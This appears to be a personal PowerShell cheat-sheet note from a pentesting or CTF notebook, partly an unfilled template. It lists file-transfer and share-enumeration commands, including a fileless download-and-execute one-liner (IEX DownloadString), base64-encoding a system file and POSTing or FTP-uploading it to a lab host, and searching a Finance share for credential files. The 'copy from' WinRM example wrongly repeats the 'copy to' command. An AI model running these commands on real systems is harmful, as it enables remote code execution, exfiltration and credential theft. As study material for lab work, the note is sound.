# powershell

_What this tool does and when I reach for it_

## Primary Use Cases

Main things I use this tool for

## Command Patterns

Decode base64 to file
```powershell
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa",[Convert]::FromBase64String("base64 conten"))
```
^decode-base64-to-file

```powershell
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```
^encode-file-contents-to-base64

Get file MD5 hash
```powershell
Get-FileHash <file> -Algorithm md5 | Select Hash
```
^get-file-md5-hash

Encrypt a file with AES
```bash
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```
^aes-encyrpt-fi


```powershell
(New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
```
^downloadfile-method

```powershell
IEX (New-Object Net.WebClient).DownloadString('<Target File URL>','<Output File Name>')
# or
(New-Object Net.WebClient).DownloadString('<Target File URL>','<Output File Name>') | IEX
```
^downloadstring-method-fileless

```powershell
Invoke-WebRequest <Target File URL> -OutFile <Output File Name> -UseBasicParsing
```
^outfile-invoke-webrequest

```powershell
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
```
^b64-file-content-variable

```powershell
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```
^send-b64-post

Upload a file
```powershell
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```
^uploadfile-method

Test WinRM connection
```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```
^test-winrm-connection

Create PSSession ^577394
```powershell
$Session = New-PSSession -ComputerName DATABASE01
```
^new-pssession

Copy file to Windows machine over WinRM connection
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
^to-transfer-winrm

Copy file from Windows machine over WinRM connection ^b37fdc
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```
^from-transfer-winrm

### Category 2

**Get-ChildItem** is the PowerShell equivalent of dir
```powershell
Get-ChildItem \\192.168.220.129\Finance\
```

can also be used to find how many files are in the shared folder and their sub-directories
```powershell
(Get-ChildItem -File -Recurse | Measure-Object).Count
```

**-Include** can be used to search for specific files
```powershell
Get-ChildItem -Recurse -Path N:\ -Include *cred* -File
```

**Select-String** is the PowerShell equivalent of grep or findstr, using regular expressions to search for text patterns in files
```powershell
Get-ChildItem -Recurse -Path N:\ | Select-String "cred" -List
```

**New-PSDrive** is the PowerShell equivalent of net use
```powershell
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem"
```

New-PSDrive can be used with credentials using a **PSCredential** object.
```powershell
$username = 'plaintext'
$password = 'Password123'
$secpassword = ConvertTo-SecureString $password -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword
New-PSDrive -Name "N" -Root "\\192.168.220.129\Finance" -PSProvider "FileSystem" -Credential $cred
```

### Category 3

Brief description of this category

command syntax ^powershell-category3

## Syntax I Forget

- Flag or option I always look up
- Parameter format I can't remember
- Output options or file formats

## When I Use This vs Alternatives

- **Use this tool when:** Specific circumstances
- **Use alternative when:** When other tools are better
- **Combines well with:** Tools that work together with this

## Personal Notes

- Things I learned from experience
- Common mistakes I made
- Environment-specific quirks

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #powershell
SORT file.ctime DESC
LIMIT 5
```

## Quick Links

- [[Primary-Technique]] - Main technique this supports
- [[Secondary-Technique]] - Other technique this supports

#powershell #tool ^debd90